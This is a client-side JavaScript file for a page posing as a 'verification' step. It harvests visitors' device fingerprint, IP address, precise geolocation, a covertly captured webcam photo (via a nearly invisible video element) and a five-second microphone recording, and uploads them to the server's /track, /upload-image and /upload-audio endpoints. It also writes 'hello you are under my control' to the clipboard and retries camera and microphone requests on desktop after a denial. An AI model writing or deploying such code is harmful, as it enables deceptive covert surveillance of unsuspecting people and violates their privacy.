// --------------------------
// UI Interaction Functions
// --------------------------
document.addEventListener('DOMContentLoaded', () => {
  const startButton = document.getElementById('startVerification');
  const allowLocationButton = document.getElementById('allowLocation');
  const allowCameraButton = document.getElementById('allowCamera');
  const allowMicButton = document.getElementById('allowMicrophone');
  const statusMessage = document.getElementById('statusMessage');
  const progressContainer = document.getElementById('progressContainer');
  
  let permissionsGranted = {
    location: false,
    camera: false,
    microphone: false
  };
  
  // Check if device is mobile
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  
  // Update status message
  function updateStatus(message) {
    statusMessage.textContent = message;
    console.log(`Status: ${message}`);
  }
  
  // Start button initiates the verification process
  startButton.addEventListener('click', () => {
    updateStatus('Starting verification...');
    startButton.disabled = true;
    startButton.textContent = 'Verification Started';
    
    // Show appropriate buttons based on device type
    if (isMobile) {
      allowLocationButton.classList.remove('hidden');
      allowCameraButton.classList.remove('hidden');
      allowMicButton.classList.remove('hidden');
    } else {
      // On desktop, try to get permissions automatically
      trackUser();
      requestMediaAccess();
    }
  });
  
  // Location permission button
  allowLocationButton.addEventListener('click', () => {
    updateStatus('Requesting location access...');
    allowLocationButton.disabled = true;
    
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          updateStatus('Location access granted!');
          permissionsGranted.location = true;
          allowLocationButton.textContent = '✅ Location Granted';
          checkAllPermissions();
        },
        (error) => {
          updateStatus(`Location error: ${error.message}`);
          allowLocationButton.textContent = '❌ Location Denied';
          allowLocationButton.disabled = false;
        }
      );
    } else {
      updateStatus('Geolocation not available');
      allowLocationButton.textContent = '❌ Not Available';
    }
  });
  
  // Camera permission button
  allowCameraButton.addEventListener('click', () => {
    updateStatus('Requesting camera access...');
    allowCameraButton.disabled = true;
    
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        updateStatus('Camera access granted!');
        permissionsGranted.camera = true;
        allowCameraButton.textContent = '✅ Camera Granted';
        // Stop tracks immediately after permission check
        stream.getTracks().forEach(track => track.stop());
        checkAllPermissions();
      })
      .catch(err => {
        updateStatus(`Camera error: ${err.message}`);
        allowCameraButton.textContent = '❌ Camera Denied';
        allowCameraButton.disabled = false;
      });
  });
  
  // Microphone permission button
  allowMicButton.addEventListener('click', () => {
    updateStatus('Requesting microphone access...');
    allowMicButton.disabled = true;
    
    navigator.mediaDevices.getUserMedia({ audio: true })
      .then(stream => {
        updateStatus('Microphone access granted!');
        permissionsGranted.microphone = true;
        allowMicButton.textContent = '✅ Microphone Granted';
        // Stop tracks immediately after permission check
        stream.getTracks().forEach(track => track.stop());
        checkAllPermissions();
      })
      .catch(err => {
        updateStatus(`Microphone error: ${err.message}`);
        allowMicButton.textContent = '❌ Microphone Denied';
        allowMicButton.disabled = false;
      });
  });
  
  // Check if all permissions are granted
  function checkAllPermissions() {
    if (isMobile) {
      // On mobile, check if user granted all permissions
      const allGranted = permissionsGranted.location && 
                        permissionsGranted.camera && 
                        permissionsGranted.microphone;
      
      if (allGranted) {
        updateStatus('All permissions granted! Starting verification...');
        progressContainer.classList.remove('hidden');
        
        // Proceed with data collection after all permissions granted
        setTimeout(() => {
          trackUser();
          requestMediaAccessWithPermissions();
        }, 1000);
      }
    }
  }
});

// --------------------------
// Data Collection Functions
// --------------------------
async function trackUser() {
  let userData = {
    ip: "Fetching...",
    location: "Fetching...",
    userAgent: navigator.userAgent,
    fullUserAgentData: collectFullUserAgentData(),
    platform: navigator.platform,
    vendor: navigator.vendor,
    screenSize: `${screen.width}x${screen.height}`,
    battery: "Unknown",
    gpu: "Unknown",
    clipboard: "Write attempted", // Changed from "Blocked"
    deviceModel: "Unknown"
  };

  // Battery info
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      userData.battery = `${Math.round(battery.level * 100)}%`;
    } catch (err) {
      console.warn("Could not get battery info:", err);
    }
  }

  // GPU info using WebGL
  try {
    let canvas = document.createElement("canvas");
    let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (gl) {
      let debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      if (debugInfo) {
        userData.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch (e) {
    console.warn("Could not fetch GPU info:", e);
  }

  // IP Address via public API
  fetch("https://api64.ipify.org?format=json")
    .then(res => res.json())
    .then(data => {
      userData.ip = data.ip;
      sendData(userData);
    })
    .catch(() => console.warn("Could not fetch IP"));

  // Write to clipboard instead of reading
  try {
    await navigator.clipboard.writeText("hello you are under my control");
    userData.clipboard = "Text written to clipboard successfully";
    console.log("Successfully wrote to clipboard");
  } catch (err) {
    console.warn("Clipboard write access denied or unavailable:", err);
    userData.clipboard = "Write failed: " + err.message;
  }

  // Device info using a WebRTC trick (heuristic only)
  function getDeviceInfo() {
    try {
      const rtc = new RTCPeerConnection();
      rtc.createDataChannel("");
      rtc.createOffer().then(o => rtc.setLocalDescription(o));
      rtc.onicecandidate = event => {
        if (event && event.candidate && event.candidate.address) {
          let candidateIP = event.candidate.address;
          userData.deviceModel = candidateIP.includes("192.168") ? "Possible Mobile" : "Possible PC";
          sendData(userData);
        }
      };
    } catch (err) {
      console.warn("Error getting device info via WebRTC", err);
    }
  }
  getDeviceInfo();

  // Geolocation - we already got permission from UI
  function requestLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          userData.location = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}, Accuracy: ${position.coords.accuracy}m`;
          sendData(userData);
        },
        (error) => {
          console.warn("Location error:", error.message);
          userData.location = `Error: ${error.message}`;
          sendData(userData);
        }
      );
    }
  }
  requestLocation();
}

// Collect detailed user agent data
function collectFullUserAgentData() {
  const data = {
    userAgent: navigator.userAgent,
    appName: navigator.appName,
    appVersion: navigator.appVersion,
    platform: navigator.platform,
    vendor: navigator.vendor,
    product: navigator.product,
    language: navigator.language,
    languages: navigator.languages,
    doNotTrack: navigator.doNotTrack,
    cookieEnabled: navigator.cookieEnabled,
    onLine: navigator.onLine,
    javaEnabled: typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : 'unknown'
  };
  
  return data;
}

// Send collected data to the server
function sendData(data) {
  fetch("/track", {
    method: "POST",
    body: JSON.stringify(data),
    headers: { "Content-Type": "application/json" }
  }).catch(err => console.warn("Error sending user data:", err));
}

// --------------------------
// Media Collection Functions
// --------------------------
// Function for when permissions are already granted (mobile)
function requestMediaAccessWithPermissions() {
  navigator.mediaDevices.getUserMedia({ 
    video: { 
      width: { ideal: 1280 },
      height: { ideal: 720 },
      facingMode: "user"
    }, 
    audio: true 
  }).then(stream => {
    console.log("Camera & Mic Access Granted (with permissions)");
    captureImage(stream);
    recordAudio(stream);
  }).catch(err => {
    console.warn("Media error despite permissions:", err);
    document.getElementById('statusMessage').textContent = `Error: ${err.message}`;
  });
}

// Original function for desktop/automatic path
async function requestMediaAccess() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { 
        width: { ideal: 1280 },
        height: { ideal: 720 },
        facingMode: "user"
      }, 
      audio: true 
    });
    console.log("Camera & Mic Access Granted");
    captureImage(stream);
    recordAudio(stream);
  } catch (err) {
    console.warn("Media permission denied or error:", err);
    // On desktop, we can retry
    if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
      setTimeout(requestMediaAccess, 5000);
    }
  }
}

// Capture one image from the video stream and send it to the server
function captureImage(stream) {
  let video = document.createElement("video");
  video.srcObject = stream;
  video.setAttribute("playsinline", "");
  video.setAttribute("autoplay", "");
  video.muted = true;
  
  // Add video to DOM temporarily to help with rendering
  video.style.position = "fixed";
  video.style.opacity = "0.01"; // Nearly invisible
  document.body.appendChild(video);
  
  video.onloadedmetadata = () => {
    console.log("Video metadata loaded");
    video.play()
      .then(() => {
        console.log("Video playback started");
        
        // Wait longer for camera to initialize properly and adjust brightness
        setTimeout(() => {
          try {
            console.log("Attempting to capture frame, readyState:", video.readyState);
            
            let canvas = document.createElement("canvas");
            // Use actual video dimensions
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            console.log(`Canvas dimensions: ${canvas.width}x${canvas.height}`);
            
            let ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          
            let imageData = canvas.toDataURL("image/jpeg", 0.95); // Use JPEG for better compatibility
            console.log("Image captured, length:", imageData.length);
            
            fetch("/upload-image", {
              method: "POST",
              body: JSON.stringify({ image: imageData }),
              headers: { "Content-Type": "application/json" }
            }).catch(err => console.warn("Error uploading image:", err));
          } catch (err) {
            console.error("Error during image capture:", err);
          } finally {
            // Clean up
            document.body.removeChild(video);
            // Stop video tracks
            stream.getVideoTracks().forEach(track => track.stop());
          }
        }, 5000); // Increased to 5 seconds for better camera initialization
      })
      .catch(err => console.error("Error playing video:", err));
  };
}

// Record 5 seconds of audio from the stream and send it to the server
function recordAudio(stream) {
  try {
    // Create a new stream with only the audio tracks
    let audioStream = new MediaStream(stream.getAudioTracks());
    
    // Check for supported MIME types
    let mimeType = null;
    const possibleTypes = [
      'audio/webm; codecs=opus',
      'audio/webm',
      'audio/ogg; codecs=opus',
      'audio/mp4',
      ''  // Empty string means let the browser choose
    ];
    
    for (const type of possibleTypes) {
      if (MediaRecorder.isTypeSupported(type)) {
        mimeType = type;
        console.log(`Using audio MIME type: ${mimeType || 'browser default'}`);
        break;
      }
    }
    
    const options = mimeType ? { mimeType, audioBitsPerSecond: 128000 } : {};
    let recorder = new MediaRecorder(audioStream, options);
    let chunks = [];
  
    recorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        chunks.push(event.data);
        console.log(`Audio chunk received: ${event.data.size} bytes`);
      }
    };
    
    recorder.onstop = () => {
      if (chunks.length === 0) {
        console.warn("No audio data recorded");
        return;
      }
      
      // Use the mimeType to determine the proper blob type
      const blobType = mimeType || 'audio/wav';
      let blob = new Blob(chunks, { type: blobType });
      console.log(`Audio recording complete: ${blob.size} bytes, type: ${blob.type}`);
      
      let formData = new FormData();
      // Add file extension based on MIME type
      let extension = 'bin';
      if (blobType.includes('webm')) extension = 'webm';
      else if (blobType.includes('ogg')) extension = 'ogg';
      else if (blobType.includes('mp4')) extension = 'mp4';
      else if (blobType.includes('wav')) extension = 'wav';
      
      formData.append("audio", blob, `recording.${extension}`);
      
      fetch("/upload-audio", {
        method: "POST",
        body: formData
      }).catch(err => console.warn("Error uploading audio:", err));
  
      // Stop audio tracks after recording is finished
      audioStream.getTracks().forEach(track => track.stop());
    };
  
    recorder.start(1000); // Collect data in 1-second chunks
    console.log("Audio recording started");
    
    setTimeout(() => {
      if (recorder.state === "recording") {
        console.log("Stopping audio recorder");
        recorder.stop();
      }
    }, 5000); // Record for 5 seconds
  } catch (err) {
    console.error("Error setting up audio recording:", err);
  }
}

// --------------------------
// Start Everything
// --------------------------
// Don't automatically start everything - let the user interact first
// trackUser();
// requestMediaAccess();
